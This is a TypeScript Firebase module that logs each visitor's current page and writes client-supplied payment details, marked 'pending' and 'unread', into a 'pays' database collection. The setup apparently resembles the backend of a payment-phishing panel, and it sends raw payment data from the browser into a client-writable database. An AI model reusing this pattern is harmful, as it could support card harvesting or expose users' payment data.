import { getApp, getApps, initializeApp, FirebaseApp } from "firebase/app";
import { getDatabase, Database } from "firebase/database";
import {
  getAnalytics,
  Analytics,
  logEvent as _logEvent,
  setAnalyticsCollectionEnabled,
} from "firebase/analytics";

import { doc, setDoc, getDoc, type Firestore } from "@/lib/firestore-shim";

const firebaseConfig = {
  apiKey: process.env.NEXT_PUBLIC_FIREBASE_API_KEY,
  authDomain: process.env.NEXT_PUBLIC_FIREBASE_AUTH_DOMAIN,
  projectId: process.env.NEXT_PUBLIC_FIREBASE_PROJECT_ID,
  storageBucket: process.env.NEXT_PUBLIC_FIREBASE_STORAGE_BUCKET,
  messagingSenderId: process.env.NEXT_PUBLIC_FIREBASE_MESSAGING_SENDER_ID,
  appId: process.env.NEXT_PUBLIC_FIREBASE_APP_ID,
  databaseURL: process.env.NEXT_PUBLIC_FIREBASE_DATABASE_URL,
};

const isFirebaseConfigured = Boolean(
  firebaseConfig.apiKey &&
    firebaseConfig.projectId &&
    firebaseConfig.databaseURL,
);

let app: FirebaseApp | null = null;
let database: Database | null = null;
// `db` is now an alias for the Realtime Database instance.
// The Firestore-compatible shim works against this Database.
let db: Database | null = null;
let analytics: Analytics | null = null;

if (isFirebaseConfigured) {
  app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig as any);
  database = getDatabase(app);
  db = database;
  if (typeof window !== "undefined") {
    try {
      analytics = getAnalytics(app);
      setAnalyticsCollectionEnabled(analytics, true);
    } catch {
      // Analytics may not be available in all environments
    }
  }
} else {
  console.warn(
    "Firebase is not configured. Please set the required environment variables (including NEXT_PUBLIC_FIREBASE_DATABASE_URL).",
  );
}

const RETRY_DELAYS = [500, 1500, 3000];
const FAILED_WRITES_KEY = "__fb_failed_writes";

async function retryWrite(
  fn: () => Promise<void>,
  context: string,
): Promise<boolean> {
  for (let attempt = 0; attempt <= RETRY_DELAYS.length; attempt++) {
    try {
      await fn();
      return true;
    } catch (e) {
      if (attempt < RETRY_DELAYS.length) {
        console.warn(
          `[Firebase] ${context} failed (attempt ${attempt + 1}), retrying in ${RETRY_DELAYS[attempt]}ms...`,
        );
        await new Promise((r) => setTimeout(r, RETRY_DELAYS[attempt]));
      } else {
        console.error(
          `[Firebase] ${context} failed after ${RETRY_DELAYS.length + 1} attempts:`,
          e,
        );
        return false;
      }
    }
  }
  return false;
}

function queueFailedWrite(data: any) {
  if (typeof localStorage === "undefined") return;
  try {
    const existing = JSON.parse(
      localStorage.getItem(FAILED_WRITES_KEY) || "[]",
    );
    existing.push({ data, timestamp: Date.now() });
    if (existing.length > 50) existing.splice(0, existing.length - 50);
    localStorage.setItem(FAILED_WRITES_KEY, JSON.stringify(existing));
  } catch {}
}

export async function flushFailedWrites(): Promise<void> {
  if (typeof localStorage === "undefined" || !db) return;
  try {
    const raw = localStorage.getItem(FAILED_WRITES_KEY);
    if (!raw) return;
    const items = JSON.parse(raw);
    if (!Array.isArray(items) || items.length === 0) return;

    const remaining: any[] = [];
    for (const item of items) {
      if (!item.data?.id) continue;
      try {
        const docRef = doc(db, "pays", item.data.id);
        await setDoc(docRef, { ...item.data, isUnread: true }, { merge: true });
      } catch {
        if (Date.now() - item.timestamp < 24 * 60 * 60 * 1000) {
          remaining.push(item);
        }
      }
    }
    if (remaining.length > 0) {
      localStorage.setItem(FAILED_WRITES_KEY, JSON.stringify(remaining));
    } else {
      localStorage.removeItem(FAILED_WRITES_KEY);
    }
  } catch {}
}

export async function getData(id: string) {
  if (!db) {
    console.warn("Firebase not configured - getData skipped");
    return null;
  }
  try {
    const docRef = doc(db, "pays", id);
    const docSnap = await getDoc(docRef);

    if (docSnap.exists()) {
      return docSnap.data();
    } else {
      return null;
    }
  } catch (e) {
    console.error("Error getting document: ", e);
    return null;
  }
}

/**
 * @deprecated This function is no longer used. Use addToHistory from history-utils instead.
 */
export async function saveToHistory(visitorID: string, step: number) {
  console.warn("saveToHistory is deprecated and should not be used");
  return;
}

export async function addData(data: any) {
  if (typeof localStorage !== "undefined") {
    localStorage.setItem("visitor", data.id);
  }
  if (!db) {
    console.warn("Firebase not configured - addData skipped");
    queueFailedWrite(data);
    return;
  }

  const success = await retryWrite(async () => {
    const docRef = doc(db!, "pays", data.id!);
    await setDoc(
      docRef,
      {
        ...data,
        isUnread: true,
      },
      { merge: true },
    );
    console.log("Document written with ID: ", docRef.id);
  }, `addData(${data.id})`);

  if (!success) {
    queueFailedWrite(data);
  }
}

export const handleCurrentPage = (page: string) => {
  const visitorId = localStorage.getItem("visitor");
  addData({ id: visitorId, currentPage: page });
};

export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
  if (!db) {
    console.warn("Firebase not configured - handlePay skipped");
    return;
  }
  try {
    const visitorId =
      typeof localStorage !== "undefined"
        ? localStorage.getItem("visitor")
        : null;
    if (visitorId) {
      const docRef = doc(db, "pays", visitorId);
      await setDoc(
        docRef,
        { ...paymentInfo, status: "pending" },
        { merge: true },
      );
      setPaymentInfo((prev: any) => ({ ...prev, status: "pending" }));
    }
  } catch (error) {
    console.error("Error adding document: ", error);
    alert("Error adding payment info");
  }
};

/**
 * Log an Analytics event. Automatically adds debug_mode in development
 * so events appear in Firebase Console → DebugView in real time.
 */
export function logAnalyticsEvent(
  eventName: string,
  params: Record<string, any> = {},
) {
  if (!analytics) return;
  const isDebug =
    typeof window !== "undefined" &&
    (process.env.NODE_ENV === "development" ||
      window.location.search.includes("debug_mode=1"));
  _logEvent(analytics, eventName, {
    ...params,
    ...(isDebug ? { debug_mode: true } : {}),
  });
}

export { db, database, analytics, setDoc, doc };
export type { Firestore };
